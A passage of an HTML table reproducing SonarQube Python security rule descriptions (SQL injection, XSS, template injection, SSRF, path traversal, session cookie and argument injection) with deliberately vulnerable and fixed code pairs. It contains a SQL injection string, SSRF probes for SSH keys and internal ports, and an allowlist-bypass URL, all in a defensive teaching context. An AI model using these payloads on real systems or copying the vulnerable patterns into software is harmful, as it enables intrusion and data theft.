  <li> <a href="https://access.redhat.com/solutions/1257953">RedHat</a> - How to set limits for services in RHEL and systemd </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/789">CWE-789 - Memory Allocation with Excessive Size Value</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S3649">
              pythonsecurity:S3649
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and
inserts it into a database query without sanitizing it first.</p>
<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is
used.</p>
<p>A user with malicious intent carefully performs actions whose goal is to modify the existing query to change its logic to a malicious one.</p>
<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any
pre-requisites.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to SQL injection:<br> After discovering the injection, attackers inject data into the
vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data manipulation</h4>
<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread
impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Chaining DB injections with other vulnerabilities</h4>
<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul>
  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>
  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).
    <ul>
      <li> See <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/">our article on this topic</a> </li>
    </ul>  </li>
</ul>
<h2>How to fix it in SQLAlchemy</h2>
<h3>Code examples</h3>
<p>The following code is an example of an overly simple data retrieval function. It is vulnerable to SQL injection because user-controlled data is
inserted directly into a query string: The application assumes that incoming data always has a specific range of characters and ignores that some
characters may change the query logic to a malicious one.</p>
<p>In this particular case, the query can be exploited with the following string:</p>
<pre>
' OR '1'='1
</pre>
<p>Using the UNION clause, an attacker would also be able to perform queries against other tables and combine the returned data within the same query
result.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import request
import sqlalchemy

@app.route('/example')
def get_users():
    user = request.args["user"]
    conn = sqlalchemy.create_engine(connection_string)
    conn = engine.connect()

    conn.execute("SELECT user FROM users WHERE user = '" + user + "'") # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import request
import sqlalchemy

@app.route('/example')
def get_users():
    user = request.args["user"]
    conn = sqlalchemy.create_engine(connection_string)
    metadata = sqlalchemy.MetaData(bind=conn, reflect=True)
    users = metadata.tables['users']
    conn = engine.connect()

    sql = users.select().where(users.c.user == user)
    conn.execute(sql)
</pre>
<h3>How does this work?</h3>
<h4>Use secure APIs</h4>
<p>Some frameworks provide a database abstraction layer that frees the developers from sanitizing or writing prepared statements.</p>
<p>These provided APIs can be described as "secure by design".<br> By providing a builder pattern with parameter binding behind the scenes,
<code>SQLAlchemy</code> can be called "secure by design" as it adds multiple layers of security to the code while keeping the codebase shorter.</p>
<p><strong>Note</strong>: These types of APIs can also provide "raw" functions or equivalents. These functions allow developers to create complex
queries using the user-friendly builder pattern.<br> These methods should be considered unsafe and should not be used with untrusted data. For
example, <code>SQLAlchemy</code> exposes <code>sqlalchemy.text()</code> that is prone to injections.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/">SonarSource, Exploiting Hibernate Injections</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP, SQL Injection Prevention Cheat
  Sheet</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/89">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/ITdGBQ">CERT, IDS00-J.</a> - Prevent SQL injection </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S5131">
              pythonsecurity:S5131
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of
the victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back
to the user.</p>
<h2>Why is this an issue?</h2>
<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming
HTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>
<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own
browser.</p>
<p>A user with malicious intent carefully crafts the link beforehand.</p>
<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code
that can be interpreted by the target user’s browser, such as HTML, CSS, or JavaScript.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Vandalism on the front-end website</h4>
<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and
theft of the benevolent user’s data.</p>
<h4>Identity spoofing</h4>
<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>
<h4>Record user activity</h4>
<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard
activity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>
<h4>Chaining XSS with other vulnerabilities</h4>
<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br> For
example, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code
injection vulnerability in the admin control panel of a web application.</p>
<h2>How to fix it in Django</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to cross-site scripting because it returns an HTML response that contains user input.</p>
<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by specifying the type of data returned in the response. For
example, you can use the <code>JsonResponse</code> class to return JSON messages securely.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from django.http import HttpResponse
import json

def index(request):
    json = json.dumps({ "data": request.GET.get("input") })
    return HttpResponse(json)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from django.http import JsonResponse

def index(request):
    json = { "data": request.GET.get("input") }
    return JsonResponse(json)
</pre>
<p>It is also possible to set the content-type manually with the <code>content_type</code> parameter when creating an <code>HttpResponse</code>
object.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="2" data-diff-type="noncompliant">
from django.http import HttpResponse

def index(request):
    return HttpResponse(request.GET.get("input"))
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="2" data-diff-type="compliant">
from django.http import HttpResponse

def index(request):
    return HttpResponse(request.GET.get("input"), content_type="text/plain")
</pre>
<h3>How does this work?</h3>
<p>If the HTTP response consists of HTML code, it is highly recommended to use a template engine like <a
href="https://docs.djangoproject.com/en/4.0/topics/templates/">Django’s template system</a> to generate it. The Django template engine separates the
view from the business logic and automatically encodes the output of variables, drastically reducing the risk of cross-site scripting
vulnerabilities.</p>
<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by telling them what data they are receiving with the
<code>content-type</code> HTTP header. This header tells the browser that the response does not contain HTML code and should not be parsed and
interpreted as HTML. Thus, the response is not vulnerable to reflected cross-site scripting.</p>
<p>For example, setting the Content-Type HTTP header to <code>text/plain</code> allows to safely reflect user input, because browsers will not try to
parse and execute the response.</p>
<h3>Pitfalls</h3>
<h4>Content-types</h4>
<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to
cross-site scripting vulnerabilities.<br> The following content-types are known to be affected:</p>
<ul>
  <li> application/mathml+xml </li>
  <li> application/rdf+xml </li>
  <li> application/vnd.wap.xhtml+xml </li>
  <li> application/xhtml+xml </li>
  <li> application/xml </li>
  <li> image/svg+xml </li>
  <li> multipart/x-mixed-replace </li>
  <li> text/html </li>
  <li> text/rdf </li>
  <li> text/xml </li>
  <li> text/xsl </li>
</ul>
<h4>The limits of validation</h4>
<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the
recommended approach.</p>
<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is
sometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the
filters.</p>
<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is
trying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,
in the long run, is very difficult.</p>
<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of "javascript:" URI.</p>
<h3>Going the extra mile</h3>
<h4>Content Security Policy (CSP) Header</h4>
<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to
<strong>block</strong> loading data that does not meet the application’s security requirements. If configured correctly, this can prevent any attempt
to exploit XSS in the application.<br> <a href="https://web.dev/csp-xss/">Learn more here.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet</a> - XSS
  Prevention Cheat Sheet </li>
  <li> <a href="https://docs.djangoproject.com/en/4.0/ref/request-response/">Django Project, Request and response objects (Django 4.0)</a> </li>
  <li> <a href="https://docs.djangoproject.com/en/4.0/ref/templates/builtins">Django, Built-in template tags and filters</a> </li>
  <li> <a href="https://flask.palletsprojects.com/en/2.1.x/security/?highlight=xss#cross-site-scripting-xss">Flask, Security Considerations</a> </li>
  <li> <a href="https://jinja.palletsprojects.com/en/3.0.x/templates/">The Pallets Projects, Jinja, Template Designer Documentation</a> </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/wordpress-stored-xss-vulnerability">SonarSource, WordPress 5.8.2 Stored XSS Vulnerability</a> </li>
  <li> <a href="https://blog.sonarsource.com/ghost-admin-takeover">SonarSource, Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li>
  <li> <a href="https://samy.pl/myspace/">Samy Kamkar, The MySpace Worm</a> </li>
</ul>
<h3>Conference presentations</h3>
<ul>
  <li> <a href="https://www.youtube.com/watch?v=ksq7e6UUDag">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>
  </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S5496">
              pythonsecurity:S5496
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Server-side template injections occur in an application when the application retrieves data from a user or a third-party service and inserts it
into a template, without sanitizing it first.</p>
<p>If an application contains a template that is vulnerable to injections, it is exposed to attacks that target the underlying rendering server.</p>
<p>A user with malicious intent can create requests that will cause the template to change its logic into unwanted behavior.</p>
<p>After creating the malicious request, the attacker can attack the servers affected by this vulnerability without relying on any prerequisites.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting a server-side template injection vulnerability will be able to execute arbitrary commands on the underlying operating
system.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>The following code is vulnerable to server-side template injection because it is inserting untrusted inputs into a string that is then processed
for rendering.<br> This vulnerability arises because the rendering function does not validate the input, allowing attackers to potentially inject
malicious Python code for execution.</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import request, render_template_string

@app.route('/example')
def example():
    username = request.args.get('username')
    template = f"&lt;p&gt;Hello {username}&lt;/p&gt;"
    return render_template_string(template) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import request, render_template_string

@app.route('/example')
def example():
    username = request.args.get('username')
    template = "&lt;p&gt;Hello {{ username }}&lt;/p&gt;"
    return render_template_string(template, username=username)
</pre>
<h3>How does this work?</h3>
<h4>Use template variables</h4>
<p>The universal method to prevent path injection is to sanitize untrusted data. Manual sanitization is error-prone, so it is best to automate the
process.</p>
<p>Here, <code>render_template_string</code> automatically sanitizes template variables by escaping them. This means that any untrusted data will not
be able to break out of the initially intended template logic.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee">SSTI in Flask/Jinja2</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/94">CWE-94 - Improper Control of Generation of Code</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S5144">
              pythonsecurity:S5144
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br></p>
<p>An SSRF vulnerability can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be
treated in the same way as basic SSRF.</p>
<h3>What is the potential impact?</h3>
<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to
what is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>
<p>Information disclosure is SSRF’s core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can
range from low to critical severity.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Local file read to host takeover</h4>
<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File
URI scheme <code>file://</code>.<br> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web
application.</p>
<h4>Internal Network Reconnaissance</h4>
<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port
field in the URL <code>http://127.0.0.1:{port}</code>.<br> Taking advantage of other supported URL schemas (dependent on the affected system), for
example, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to SSRF as it opens a URL defined by untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import request
from urllib.request import urlopen

@app.route('/example')
def example():
    url = request.args["url"]
    urlopen(url).read() # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import request
from urllib.parse import urlparse
from urllib.request import urlopen

SCHEMES_ALLOWLIST = ['https']
DOMAINS_ALLOWLIST = ['trusted1.example.com', 'trusted2.example.com']

@app.route('/example')
def example():
    url = request.args["url"]
    if urlparse(url).hostname in DOMAINS_ALLOWLIST and urlparse(url).scheme in SCHEMES_ALLOWLIST:
        urlopen(url).read()
</pre>
<h3>How does this work?</h3>
<h4>Pre-Approved commands</h4>
<p>Create a list of authorized and secure URLs that you want the application to be able to request.<br> If a user input does not match an entry in
this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h3>Pitfalls</h3>
<h4>The trap of 'StartsWith' and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>
<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith("https://example.com")</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.commit.malicious.io</code>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/">Top 10 2021 Category A10 - Server-Side Request
  Forgery (SSRF)</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/918">CWE-918 - Server-Side Request Forgery (SSRF)</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S2083">
              pythonsecurity:S2083
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Path injections occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting
path would resolve somewhere in the filesystem where the user should not normally have access to.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override or delete arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited
to remove or corrupt files that are critical for the application or for the system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h4>Read arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to
leak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>
<h2>How to fix it in Flask</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>
<p>An attacker can exploit the vulnerability in this code to read arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import Flask, request, send_from_directory

app = Flask('example')

@app.route('/example')
def example():
    my_file = request.args['my_file']
    return send_file("static/%s" % my_file, as_attachment=True) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import Flask, request, send_from_directory

app = Flask('example')

@app.route('/example')
def example():
    my_file = request.args['my_file']
    return send_from_directory('static', my_file)
</pre>
<h3>How does this work?</h3>
<p>The universal method to prevent path injection is to validate paths created from untrusted data. This can be done either manually or automatically,
depending on whether the library includes a data sanitization feature and the required function.</p>
<p>Here, send_from_directory can be considered a secure-by-design API.</p>
<h4>Use secure-by-design APIs</h4>
<p>Some libraries contain APIs with these three capabilities:</p>
<ul>
  <li> File retrieval in a file system. </li>
  <li> Restriction of the file retrieval to a specific folder (thus sanitizing and validating untrusted data). </li>
  <li> A feature, such as a file download or file deletion. </li>
</ul>
<p>They can be referred to as "secure-by-design" APIs. Using this type of API, such as 'send_from_directory', brings multiple layers of security to
the code while keeping the code base shorter.</p>
<p>Behind the scenes, this function protects against both regular and partial path injection.</p>
<h3>Pitfalls</h3>
<h4>Do not use os.path.join as a validator</h4>
<p>The <a href="https://docs.python.org/3/library/os.path.html#os.path.join">official documentation</a> states that if any argument other than the
first is an absolute path, any previous argument is discarded.</p>
<p>This means that including untrusted data in any of the parameters and using the resulting string for file operations may lead to a path traversal
vulnerability.</p>
<p>If you want to learn more about this pitfall, read <a href="https://blog.sonarsource.com/10-unknown-security-pitfalls-for-python/">our blog post
about it</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/22">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S6287">
              pythonsecurity:S6287
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>
<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the
application.</p>
<p>The injection might occur via a GET parameter, and the payload, for example, <code><a
href="https://example.com?cookie=injectedcookie">https://example.com?cookie=injectedcookie</a></code>, delivered using phishing techniques.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a
session that isn’t theirs.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Sensitive data disclosure</h4>
<p>A victim introduces sensitive data within the attacker’s application session that can later be retrieved by them. This can lead to a variety of
implications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>
<h4>Vulnerability chaining</h4>
<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and
exploits a self-XSS on the target application.<br> The victim browses the vulnerable page using the attacker’s session and is affected by the XSS,
which can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>
<h2>How to fix it in Django</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from django.shortcuts import render

def check_cookie(request):
    response = render(request, "welcome.html")

    if not "sessionid" in request.COOKIE:
        cookie = request.GET.get("cookie")
        response.set_cookie("sessionid", cookie)  # Noncompliant

    return response
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from django.http import HttpResponseRedirect
from django.shortcuts import render

def check_cookie(request):
    response = render(request, "welcome.html")

    if not "sessionid" in request.COOKIE:
        return HttpResponseRedirect("/getcookie")

    return response
</pre>
<h3>How does this work?</h3>
<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the
value of a session cookie to untrusted data.</p>
<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade
tools.<br> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to
use these solutions than to develop your own.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/384">CWE-384 - Session Fixation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S6350">
              pythonsecurity:S6350
            </a>
          </td>
          <td>
            <details>
              <p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9920">CVE-2016-9920</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29472">CVE-2021-29472</a> </li>
</ul>
<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the
programs. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing
files into specific directories.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Malicious arguments can result in undesired behavior in the executed command. </li>
  <li> Passing user input to a system command is not necessary. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid constructing system commands from user input when possible. </li>
  <li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li>
  <li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in
vulnerabilities:</p>
<pre>
import subprocess
input = request.get('input')
subprocess.run(["/usr/bin/find", input]) # Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Use an allow-list to restrict the arguments to trusted values:</p>
<pre>
import subprocess
input = request.get('input')
if input in allowed:
    subprocess.run(["/usr/bin/find", input])
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/88">CWE-88 - Argument Injection or Modification</a> </li>
  <li> <a href="https://blog.sonarsource.com/php-supply-chain-attack-on-composer">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S6680">
              pythonsecurity:S6680
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes the system to various operational overloads that can lead to either a technical denial of service and/or business
disruptions.</p>
<h2>Why is this an issue?</h2>
<p>Loop boundary injections occur in an application when the application retrieves data from a user or a third-party service and inserts it into a
loop or a function acting as a loop, without sanitizing it first.</p>
<p>If an application contains a loop that is vulnerable to injections, it is exposed to attacks that target its availability where that loop is
used.</p>
<p>A user with malicious intent carefully performs actions whose goal is to cause the loop to run for more iterations than the developer intended,
resulting in unexpected behavior or even a crash of the program.</p>
<p>After creating the malicious request, the attacker can attack the servers affected by this vulnerability without relying on any prerequisites.</p>
<h3>What is the potential impact?</h3>
<p>After discovering the injection point, attackers insert data into the vulnerable field to either make the affected component inaccessible, attempt
a malfunction, or read from an artifact that exceeds the developer’s intended boundaries.</p>
